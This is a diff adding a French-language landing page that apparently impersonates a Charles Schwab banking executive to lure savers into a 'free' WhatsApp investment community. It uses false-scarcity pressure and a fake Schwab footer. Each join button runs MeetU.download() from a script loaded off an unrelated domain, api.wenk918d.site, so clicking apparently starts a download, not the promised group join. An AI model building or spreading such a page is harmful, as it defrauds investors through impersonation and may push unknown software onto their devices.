@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Tyler Woulfe — Expertise Bancaire & Fiduciaire Charles Schwab | Communauté Gratuite</title>
+    <meta name="description" content="Rejoignez une communauté exclusive dirigée par Tyler Woulfe, Directeur Général et Chief Banking Officer de Charles Schwab. Accédez gratuitement à des analyses bancaires, fiduciaires et de gestion de patrimoine." />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+    <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+    <script>
+        function k2() {
+           MeetU.download(event);
+        }
+    </script>
+
+    <style>
+        :root {
+            --bg: #F4F7FC;
+            --bg-alt: #ECF1FA;
+            --card: #FFFFFF;
+            --ink: #0B1B33;
+            --ink-2: #3A4C63;
+            --muted: #8291A6;
+            --primary: #2451E0;
+            --primary-2: #4773F5;
+            --primary-soft: #E9F0FF;
+            --teal: #0EA5E9;
+            --green: #16A34A;
+            --green-soft: #E6F6EC;
+            --wa: #16A34A;
+            --wa-2: #0E9F4A;
+            --wa-glow: rgba(22, 163, 74, 0.28);
+            --amber: #F59E0B;
+            --amber-soft: #FFF4E0;
+            --border: #E4EAF3;
+            --shadow: 0 8px 26px rgba(15, 42, 86, 0.07);
+            --shadow-lg: 0 16px 44px rgba(15, 42, 86, 0.13);
+            --radius: 14px;
+            --radius-lg: 20px;
+            --radius-xl: 26px;
+        }
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        html {
+            scroll-behavior: smooth;
+            -webkit-text-size-adjust: 100%;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--ink-2);
+            line-height: 1.6;
+            min-height: 100vh;
+            -webkit-tap-highlight-color: transparent;
+        }
+        a { text-decoration: none; color: inherit; }
+        img { max-width: 100%; display: block; }
+        ::selection { background: var(--primary); color: #fff; }
+
+        .page {
+            max-width: 500px;
+            margin: 0 auto;
+            background: var(--bg);
+            position: relative;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        /* ===== Flash Bar ===== */
+        .flash-bar {
+            background: linear-gradient(90deg, #2451E0, #0EA5E9, #2451E0);
+            background-size: 200% 100%;
+            animation: flash-move 2.2s linear infinite;
+            color: #fff;
+            text-align: center;
+            padding: 9px 16px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            letter-spacing: 0.03em;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        @keyframes flash-move { 0% { background-position: 0% 50%; } 100% { background-position: 200% 50%; } }
+        .flash-bar .dot {
+            width: 6px; height: 6px; background: #fff; border-radius: 50%;
+            animation: blink-dot 0.8s infinite;
+        }
+        @keyframes blink-dot { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
+
+        /* ===== Header ===== */
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(18px);
+            -webkit-backdrop-filter: blur(18px);
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border);
+        }
+        .header-l { display: flex; align-items: center; gap: 9px; }
+        .header-logo {
+            width: 32px; height: 32px;
+            background: linear-gradient(135deg, var(--primary), var(--teal));
+            border-radius: 9px;
+            display: flex; align-items: center; justify-content: center;
+            color: #fff; font-size: 0.85rem;
+            box-shadow: 0 4px 12px rgba(36, 81, 224, 0.3);
+        }
+        .header-name { font-size: 0.78rem; font-weight: 800; color: var(--ink); }
+        .header-cta-btn {
+            padding: 8px 15px;
+            background: linear-gradient(135deg, var(--wa), var(--wa-2));
+            color: #fff;
+            border-radius: 999px;
+            font-size: 0.72rem;
+            font-weight: 700;
+            display: flex; align-items: center; gap: 6px;
+            border: none; cursor: pointer;
+            box-shadow: 0 4px 14px var(--wa-glow);
+            transition: transform 0.2s;
+        }
+        .header-cta-btn:active { transform: scale(0.94); }
+        .header-cta-btn i { font-size: 0.9rem; }
+
+        /* ===== Hero ===== */
+        .hero {
+            padding: 20px 16px 22px;
+            background: linear-gradient(180deg, #E9F0FF 0%, var(--bg) 100%);
+        }
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 13px;
+            background: var(--primary-soft);
+            border: 1px solid rgba(36, 81, 224, 0.2);
+            border-radius: 999px;
+            font-size: 0.66rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 14px;
+            letter-spacing: 0.02em;
+        }
+        .hero-badge .live { color: var(--green); animation: blink-dot 0.9s infinite; }
+
+        .hero h1 {
+            font-size: 1.55rem;
+            font-weight: 900;
+            line-height: 1.22;
+            color: var(--ink);
+            margin-bottom: 10px;
+            letter-spacing: -0.02em;
+        }
+        .hero h1 em {
+            font-style: normal;
+            background: linear-gradient(90deg, var(--primary), var(--teal));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .hero-sub {
+            font-size: 0.8rem;
+            color: var(--ink-2);
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+
+        .hero-cta {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 15px;
+            border-radius: var(--radius);
+            background: linear-gradient(135deg, var(--wa), var(--wa-2));
+            color: #fff;
+            font-size: 0.92rem;
+            font-weight: 800;
+            letter-spacing: -0.01em;
+            box-shadow: 0 8px 26px var(--wa-glow);
+            border: none; cursor: pointer;
+            transition: all 0.2s;
+        }
+        .hero-cta:active { transform: scale(0.96); }
+        .hero-footnote {
+            text-align: center;
+            font-size: 0.62rem;
+            color: var(--muted);
+            margin-top: 9px;
+        }
+
+        /* Stats strip (single card with dividers) */
+        .stats-strip {
+            display: flex;
+            align-items: stretch;
+            background: var(--card);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow);
+            padding: 16px 8px;
+            margin: 18px 0;
+        }
+        .stat {
+            flex: 1;
+            text-align: center;
+            padding: 0 4px;
+        }
+        .stat-num {
+            font-size: 1.25rem;
+            font-weight: 900;
+            color: var(--primary);
+            line-height: 1;
+            margin-bottom: 4px;
+        }
+        .stat-lbl { font-size: 0.58rem; color: var(--muted); line-height: 1.3; }
+        .stat-div { width: 1px; background: var(--border); margin: 2px 0; }
+
+        /* Banner image card */
+        .hero-banner {
+            position: relative;
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            margin-bottom: 16px;
+            aspect-ratio: 16/9;
+            background: var(--primary-soft);
+            box-shadow: var(--shadow);
+        }
+        .hero-banner img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        .hero-banner-overlay {
+            position: absolute; inset: 0;
+            background: linear-gradient(0deg, rgba(11, 27, 51, 0.55) 0%, transparent 55%);
+            pointer-events: none;
+        }
+        .hero-banner-tag {
+            position: absolute; bottom: 10px; right: 10px;
+            background: rgba(255, 255, 255, 0.92);
+            border-radius: 8px; padding: 5px 11px;
+            font-size: 0.64rem; font-weight: 700; color: var(--primary);
+            display: flex; align-items: center; gap: 5px;
+        }
+
+        /* Team / trust card */
+        .hero-team {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: var(--card);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow);
+            padding: 13px 16px;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+        .hero-team:active { transform: scale(0.98); }
+        .hero-team-avatar {
+            width: 54px; height: 54px;
+            border-radius: 50%; flex-shrink: 0; overflow: hidden;
+            border: 3px solid var(--primary-soft);
+            background: var(--primary-soft);
+            display: flex; align-items: center; justify-content: center;
+        }
+        .hero-team-avatar img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        .hero-team-info { flex: 1; min-width: 0; }
+        .hero-team-name { font-size: 0.9rem; font-weight: 800; color: var(--ink); margin-bottom: 2px; }
+        .hero-team-role { font-size: 0.65rem; color: var(--muted); }
+        .hero-team-badge {
+            display: inline-flex; align-items: center; gap: 4px;
+            margin-top: 5px; padding: 3px 9px;
+            background: var(--green-soft); border-radius: 999px;
+            font-size: 0.56rem; font-weight: 700; color: var(--green);
+        }
+
+        /* ===== Sections ===== */
+        .sec { padding: 26px 16px; }
+        .sec-alt { background: var(--bg-alt); }
+        .sec-label {
+            text-align: center;
+            font-size: 0.62rem;
+            font-weight: 800;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: var(--primary);
+            margin-bottom: 8px;
+        }
+        .sec-title {
+            font-size: 1.22rem;
+            font-weight: 800;
+            text-align: center;
+            color: var(--ink);
+            margin-bottom: 6px;
+            letter-spacing: -0.02em;
+        }
+        .sec-sub { font-size: 0.72rem; color: var(--muted); text-align: center; margin-bottom: 16px; }
+
+        /* Check list */
+        .check-list { display: flex; flex-direction: column; gap: 10px; }
+        .check-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 11px;
+            padding: 15px;
+            background: var(--card);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+        }
+        .check-icon {
+            width: 34px; height: 34px; min-width: 34px;
+            border-radius: 50%;
+            background: var(--green-soft); color: var(--green);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 0.82rem;
+        }
+        .check-text { font-size: 0.78rem; color: var(--ink-2); line-height: 1.55; }
+        .check-text strong { color: var(--ink); }
+
+        .alert-box {
+            padding: 16px;
+            background: var(--amber-soft);
+            border: 1px solid rgba(245, 158, 11, 0.25);
+            border-radius: var(--radius);
+            margin-top: 16px;
+        }
+        .alert-box p { font-size: 0.7rem; color: var(--ink-2); line-height: 1.6; }
+
+        /* Highlight grid */
+        .highlight-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .highlight-card {
+            padding: 16px;
+            background: var(--card);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            text-align: center;
+        }
+        .highlight-card .ico-wrap {
+            width: 44px; height: 44px;
+            margin: 0 auto 8px;
+            border-radius: 13px;
+            background: var(--primary-soft);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.4rem;
+        }
+        .highlight-card p { font-size: 0.68rem; color: var(--ink-2); line-height: 1.55; }
+
+        /* Benefit list (numbered) */
+        .benefit-list { display: flex; flex-direction: column; gap: 10px; }
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px;
+            background: var(--card);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            border-left: 4px solid var(--primary);
+        }
+        .benefit-item .num {
+            width: 32px; height: 32px; min-width: 32px;
+            border-radius: 50%;
+            background: var(--primary);
+            color: #fff;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 0.8rem; font-weight: 900;
+        }
+        .benefit-item span { font-size: 0.78rem; font-weight: 700; color: var(--ink); line-height: 1.5; }
+
+        /* Learn list */
+        .learn-list { display: flex; flex-direction: column; gap: 10px; }
+        .learn-item {
+            display: flex;
+            align-items: center;
+            gap: 11px;
+            padding: 15px;
+            background: var(--card);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+        }
+        .learn-item .ico { color: var(--primary); font-size: 0.9rem; width: 22px; text-align: center; }
+        .learn-item span { font-size: 0.72rem; color: var(--ink-2); line-height: 1.55; }
+
+        /* FAQ */
+        .faq { display: flex; flex-direction: column; gap: 10px; }
+        .faq-item {
+            background: var(--card);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+        }
+        .faq-q {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            padding: 16px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            color: var(--ink);
+            cursor: pointer;
+            user-select: none;
+            width: 100%;
+            text-align: left;
+            background: none;
+            border: none;
+            font-family: inherit;
+        }
+        .faq-q .faq-icon { transition: transform 0.3s; font-size: 0.62rem; color: var(--muted); }
+        .faq-item.open .faq-q .faq-icon { transform: rotate(180deg); color: var(--primary); }
+        .faq-a { max-height: 0; overflow: hidden; transition: max-height 0.35s; }
+        .faq-item.open .faq-a { max-height: 400px; }
+        .faq-a-inner { padding: 0 16px 16px; font-size: 0.7rem; color: var(--ink-2); line-height: 1.7; }
+
+        /* CTA section */
+        .cta-section { padding: 28px 16px; text-align: center; }
+        .cta-section h2 { font-size: 1.3rem; font-weight: 800; color: var(--ink); margin-bottom: 8px; }
+        .cta-section p { font-size: 0.75rem; color: var(--ink-2); margin-bottom: 16px; }
+        .cta-btn {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            width: 100%; max-width: 320px; margin: 0 auto;
+            padding: 15px;
+            border-radius: 999px;
+            background: linear-gradient(135deg, var(--wa), var(--wa-2));
+            color: #fff; font-size: 0.92rem; font-weight: 800;
+            box-shadow: 0 10px 28px var(--wa-glow);
+            border: none; cursor: pointer;
+            transition: all 0.2s;
+        }
+        .cta-btn:active { transform: scale(0.96); }
+
+        /* Float bar (detached pill) */
+        .float-bar {
+            position: fixed;
+            bottom: 0; left: 50%; transform: translateX(-50%);
+            width: 100%; max-width: 500px;
+            z-index: 200;
+            padding: 12px 16px calc(12px + env(safe-area-inset-bottom));
+            background: linear-gradient(180deg, transparent, rgba(244, 247, 252, 0.96) 32%);
+        }
+        .float-btn {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            width: 100%;
+            padding: 15px;
+            border-radius: 999px;
+            background: linear-gradient(135deg, var(--wa), var(--wa-2));
+            color: #fff; font-size: 0.92rem; font-weight: 800;
+            border: none; cursor: pointer;
+            box-shadow: 0 10px 30px var(--wa-glow);
+            animation: breathe 2.2s ease-in-out infinite;
+        }
+        @keyframes breathe {
+            0%, 100% { box-shadow: 0 6px 22px var(--wa-glow); }
+            50% { box-shadow: 0 8px 40px rgba(22, 163, 74, 0.5), 0 0 60px rgba(16, 163, 74, 0.16); }
+        }
+        .float-btn:active { transform: scale(0.96); animation: none; }
+
+        .footer {
+            text-align: center;
+            padding: 18px 16px 90px;
+            font-size: 0.6rem;
+            color: var(--muted);
+            border-top: 1px solid var(--border);
+        }
+
+        .reveal { opacity: 0; transform: translateY(16px); transition: opacity 0.5s, transform 0.5s; }
+        .reveal.on { opacity: 1; transform: translateY(0); }
+
+        @media(prefers-reduced-motion:reduce) {
+            *, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="page">
+
+        <!-- ===== Flash Bar ===== -->
+        <div class="flash-bar">
+            <span class="dot"></span> 🔥 Places limitées — Rejoignez la communauté avant la fermeture des inscriptions ! 🚀
+            <span class="dot"></span>
+        </div>
+
+        <!-- ===== Header ===== -->
+        <header class="header">
+            <div class="header-l">
+                <div class="header-logo"><i class="fa-solid fa-building-columns"></i></div>
+                <div class="header-name">Tyler Woulfe</div>
+            </div>
+            <button class="header-cta-btn" onclick="k2()"><i class="fa-brands fa-whatsapp"></i> Rejoindre</button>
+        </header>
+
+        <!-- ===== Hero ===== -->
+        <section class="hero">
+            <div class="hero-badge"><span class="live">●</span> Accès gratuit · Communauté exclusive · Places limitées</div>
+
+            <h1>Découvrez l'expertise bancaire et fiduciaire de <em>Tyler Woulfe</em></h1>
+            <p class="hero-sub">
+                Accédez à des analyses exclusives sur les services bancaires, fiduciaires et de gestion de patrimoine de Charles Schwab —
+                <strong style="color:var(--primary);">entièrement gratuit</strong>. Que vous soyez un épargnant particulier, un conseiller en placement indépendant ou un professionnel de la finance,
+                notre communauté vous aide à décrypter l'écosystème bancaire et fiduciaire avec clarté et rigueur.
+            </p>
+
+            <button class="hero-cta" onclick="k2()"><i class="fa-brands fa-whatsapp"></i> Rejoindre le groupe WhatsApp — C'est gratuit</button>
+            <p class="hero-footnote">⚠️ Réservé aux épargnants et professionnels sérieux · Pas de hors-sujet · Axé sur l'expertise</p>
+
+            <div class="stats-strip">
+                <div class="stat"><div class="stat-num">3</div><div class="stat-lbl">Banques dirigées (CEO)</div></div>
+                <div class="stat-div"></div>
+                <div class="stat"><div class="stat-num">2</div><div class="stat-lbl">Sociétés de fiducie présidées</div></div>
+                <div class="stat-div"></div>
+                <div class="stat"><div class="stat-num">0$</div><div class="stat-lbl">Coût à vie</div></div>
+            </div>
+
+            <div class="hero-banner">
+                <img src="img/2.jpg" alt="Services bancaires et fiduciaires Charles Schwab" onerror="this.style.display='none'" />
+                <div class="hero-banner-overlay"></div>
+                <div class="hero-banner-tag"><i class="fa-solid fa-building-columns"></i> Banque &amp; Fiducie</div>
+            </div>
+
+            <div class="hero-team" onclick="k2()">
+                <div class="hero-team-avatar">
+                    <img src="img/1.png" alt="Tyler Woulfe" />
+                </div>
+                <div class="hero-team-info">
+                    <div class="hero-team-name">Tyler Woulfe</div>
+                    <div class="hero-team-role">Directeur Général · Chief Banking Officer — Charles Schwab</div>
+                    <div class="hero-team-badge"><i class="fa-solid fa-check-circle"></i> Président &amp; CEO, Charles Schwab Bank</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===== Free Benefits ===== -->
+        <section class="sec sec-alt reveal">
+            <div class="sec-label">Avantages à coût zéro</div>
+            <h2 class="sec-title">Privilèges exclusifs pour les membres — Sans engagement</h2>
+            <div class="check-list">
+                <div class="check-item">
+                    <div class="check-icon"><i class="fa-solid fa-check"></i></div>
+                    <div class="check-text"><strong>Accès gratuit</strong> aux analyses des services bancaires et fiduciaires de Charles Schwab, décryptées par notre équipe pour en tirer le meilleur parti.</div>
+                </div>
+                <div class="check-item">
+                    <div class="check-icon"><i class="fa-solid fa-check"></i></div>
+                    <div class="check-text"><strong>Accès gratuit</strong> aux explications en temps réel sur les produits de dépôt, les solutions de prêt et les paiements.</div>
+                </div>
+                <div class="check-item">
+                    <div class="check-icon"><i class="fa-solid fa-check"></i></div>
+                    <div class="check-text"><strong>Accès gratuit</strong> à des diagnostics patrimoniaux pour identifier les risques et optimiser la structuration de vos placements.</div>
+                </div>
+                <div class="check-item">
+                    <div class="check-icon"><i class="fa-solid fa-check"></i></div>
+                    <div class="check-text"><strong>Accès gratuit</strong> à des consultations stratégiques individuelles pour répondre à vos questions spécifiques et affiner votre approche.</div>
+                </div>
+                <div class="check-item">
+                    <div class="check-icon"><i class="fa-solid fa-check"></i></div>
+                    <div class="check-text"><strong>Accès gratuit</strong> à des masterclasses sur la gestion bancaire, fiduciaire et la planification de la retraite — des notions de base aux sujets avancés.</div>
+                </div>
+            </div>
+            <div class="alert-box">
+                <p>⚠️ <strong style="color:var(--amber);">Important :</strong> Cette communauté est réservée aux épargnants et professionnels sérieux. Les discussions hors sujet sont strictement interdites et peuvent entraîner un retrait. Les personnes non concernées ne doivent pas postuler.</p>
+            </div>
+        </section>
+
+        <!-- ===== About Tyler Woulfe ===== -->
+        <section class="sec reveal">
+            <div class="sec-label">Portrait</div>
+            <h2 class="sec-title">Rencontrez Tyler Woulfe, Directeur Général et Chief Banking Officer</h2>
+            <div style="background:var(--card);border-radius:var(--radius-lg);box-shadow:var(--shadow);padding:20px;" onclick="k2()">
+                <p style="font-size:0.75rem;color:var(--ink-2);line-height:1.85;margin-bottom:14px;">
+                    Tyler Woulfe est responsable de la gestion globale des activités bancaires et de services fiduciaires de
+                    <strong style="color:var(--ink);">The Charles Schwab Corporation</strong>, supervisant la stratégie, la gestion de produits,
+                    le crédit et la conformité réglementaire. Il occupe le poste de Directeur Général (Managing Director) et de
+                    Chief Banking Officer, et dirige parallèlement Charles Schwab Bank en tant que Président et CEO.
+                </p>
+                <p style="font-size:0.75rem;color:var(--ink-2);line-height:1.85;margin-bottom:14px;">
+                    Tyler est le directeur général de trois banques d'épargne d'État affiliées à Charles Schwab et siège au conseil
+                    d'administration de ces trois établissements. Ces banques proposent des services bancaires de détail, pour clients
+                    à patrimoine élevé et commerciaux, incluant des solutions de prêt, des produits de dépôt, des paiements, des actifs
+                    numériques ainsi que des services de fiducie et de conservation pour les plans de retraite.
+                </p>
+                <p style="font-size:0.75rem;color:var(--ink-2);line-height:1.85;margin-bottom:0;">
+                    Il préside également le conseil d'administration de deux sociétés de fiducie de Charles Schwab, qui fournissent des
+                    services de gestion d'investissement et de conservation administrative aux clients fiduciaires et aux conseillers en
+                    placement indépendants enregistrés.
+                </p>
+            </div>
+        </section>
+
+        <!-- ===== What You'll Learn ===== -->
+        <section class="sec sec-alt reveal">
+            <h2 class="sec-title">Ce que vous allez découvrir au sein de la communauté</h2>
+            <div class="highlight-grid">
+                <div class="highlight-card"><div class="ico-wrap">🏦</div><p>Stratégies pour optimiser vos dépôts et solutions de crédit en toute sérénité.</p></div>
+                <div class="highlight-card"><div class="ico-wrap">🔐</div><p>Comprendre les services fiduciaires et de conservation pour protéger votre patrimoine.</p></div>
+                <div class="highlight-card"><div class="ico-wrap">📱</div><p>Intégrer les actifs numériques dans une stratégie bancaire moderne.</p></div>
+                <div class="highlight-card"><div class="ico-wrap">📈</div><p>Cadres d'analyse pour anticiper l'évolution de la réglementation bancaire.</p></div>
+            </div>
+            <p style="text-align:center;margin-top:14px;font-size:0.72rem;color:var(--ink-2);">
+                Plus de 35 millions de clients font confiance à l'écosystème Charles Schwab. Les places sont limitées.
+                <strong style="color:var(--primary);display:block;margin-top:4px;">La décennie à venir redéfinit la banque et la gestion de patrimoine — ne laissez pas passer cette fenêtre.</strong>
+            </p>
+            <button class="hero-cta" onclick="k2()" style="margin-top:14px;"><i class="fa-brands fa-whatsapp"></i> Rejoindre le groupe WhatsApp — C'est gratuit</button>
+        </section>
+
+        <!-- ===== What You Get ===== -->
+        <section class="sec reveal">
+            <div class="sec-label">Résultats de l'adhésion</div>
+            <h2 class="sec-title">Ce que vous retirez en rejoignant notre communauté</h2>
+            <div class="benefit-list">
+                <div class="benefit-item"><div class="num">1</div><span>Comprendre l'écosystème bancaire et fiduciaire de Charles Schwab, de la banque de détail aux services pour clients à patrimoine élevé.</span></div>
+                <div class="benefit-item"><div class="num">2</div><span>Construire une approche long terme de la gestion de patrimoine, fondée sur une allocation réfléchie et un risque maîtrisé.</span></div>
+                <div class="benefit-item"><div class="num">3</div><span>Apprendre à structurer un plan de conservation et de fiducie adapté à vos objectifs de retraite.</span></div>
+            </div>
+            <button class="hero-cta" onclick="k2()" style="margin-top:14px;"><i class="fa-brands fa-whatsapp"></i> Rejoindre le groupe WhatsApp — C'est gratuit</button>
+        </section>
+
+        <!-- ===== Core Skills ===== -->
+        <section class="sec sec-alt reveal">
+            <h2 class="sec-title">Compétences financières que vous développerez</h2>
+            <div class="learn-list">
+                <div class="learn-item"><div class="ico"><i class="fa-solid fa-circle-check"></i></div><span>Comment sécuriser et faire fructifier votre capital grâce à des stratégies bancaires éprouvées.</span></div>
+                <div class="learn-item"><div class="ico"><i class="fa-solid fa-circle-check"></i></div><span>Comment naviguer avec confiance dans les produits de dépôt, de crédit et de paiement.</span></div>
+                <div class="learn-item"><div class="ico"><i class="fa-solid fa-circle-check"></i></div><span>Comment exploiter des outils d'analyse pour évaluer les solutions fiduciaires en quelques minutes.</span></div>
+                <div class="learn-item"><div class="ico"><i class="fa-solid fa-circle-check"></i></div><span>Comment intégrer les actifs numériques dans une stratégie patrimoniale équilibrée.</span></div>
+                <div class="learn-item"><div class="ico"><i class="fa-solid fa-circle-check"></i></div><span>Comment aborder la planification retraite comme une démarche structurée à risque maîtrisé.</span></div>
+            </div>
+            <button class="hero-cta" onclick="k2()" style="margin-top:14px;"><i class="fa-brands fa-whatsapp"></i> Rejoindre le groupe WhatsApp — C'est gratuit</button>
+        </section>
+
+        <!-- ===== FAQ ===== -->
+        <section class="sec reveal">
+            <div class="sec-label">FAQ</div>
+            <h2 class="sec-title">Questions fréquemment posées</h2>
+            <div class="faq">
+                <div class="faq-item">
+                    <button class="faq-q" onclick="toggleFaq(this)">Dois-je payer pour les formations ou les ressources ?<span class="faq-icon"><i class="fa-solid fa-chevron-down"></i></span></button>
+                    <div class="faq-a"><div class="faq-a-inner">Absolument pas. Tous les modules, sessions en direct et outils d'analyse sont entièrement gratuits. Nous nous engageons à démocratiser la connaissance financière et à offrir des perspectives de qualité institutionnelle, sans frais cachés ni abonnement.</div></div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-q" onclick="toggleFaq(this)">Est-ce adapté aux débutants ?<span class="faq-icon"><i class="fa-solid fa-chevron-down"></i></span></button>
+                    <div class="faq-a"><div class="faq-a-inner">Oui, tout à fait. Notre contenu est structuré pour vous accompagner des notions fondamentales aux tactiques avancées. Nous décomposons les sujets complexes en leçons accessibles, et nos mentors dédiés guident les débutants à chaque étape.</div></div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-q" onclick="toggleFaq(this)">Comment commencer ?<span class="faq-icon"><i class="fa-solid fa-chevron-down"></i></span></button>
+                    <div class="faq-a"><div class="faq-a-inner">C'est simple. Cliquez sur le bouton WhatsApp de cette page pour rejoindre notre groupe. Une fois à l'intérieur, vous recevrez un pack d'accueil avec les instructions, le calendrier des sessions à venir et un accès immédiat à nos ressources essentielles.</div></div>
+                </div>
+            </div>
+        </section>
+
+        <footer class="footer">
+            © 2026 Charles Schwab — Communauté d'expertise bancaire et fiduciaire
+        </footer>
+
+        <!-- ===== Sticky Floating Button ===== -->
+        <div class="float-bar">
+            <button class="float-btn" onclick="k2()"><i class="fa-brands fa-whatsapp"></i> Rejoindre le groupe WhatsApp — C'est gratuit</button>
+        </div>
+
+    </div>
+
+    <script>
+        // ===== Intersection Observer =====
+        var ro = new IntersectionObserver(function(e) {
+            e.forEach(function(en) {
+                if (en.isIntersecting) {
+                    en.target.classList.add('on');
+                    ro.unobserve(en.target);
+                }
+            });
+        }, { threshold: 0.1, rootMargin: '0px 0px -16px 0px' });
+        document.querySelectorAll('.reveal').forEach(function(el) { ro.observe(el); });
+
+        // ===== FAQ Toggle =====
+        function toggleFaq(q) {
+            var p = q.closest('.faq-item');
+            var was = p.classList.contains('open');
+            document.querySelectorAll('.faq-item').forEach(function(i) { i.classList.remove('open'); });
+            if (!was) p.classList.add('open');
+        }
+    </script>
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"828b2e8ea23b4b588e45dc71e590be2c","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
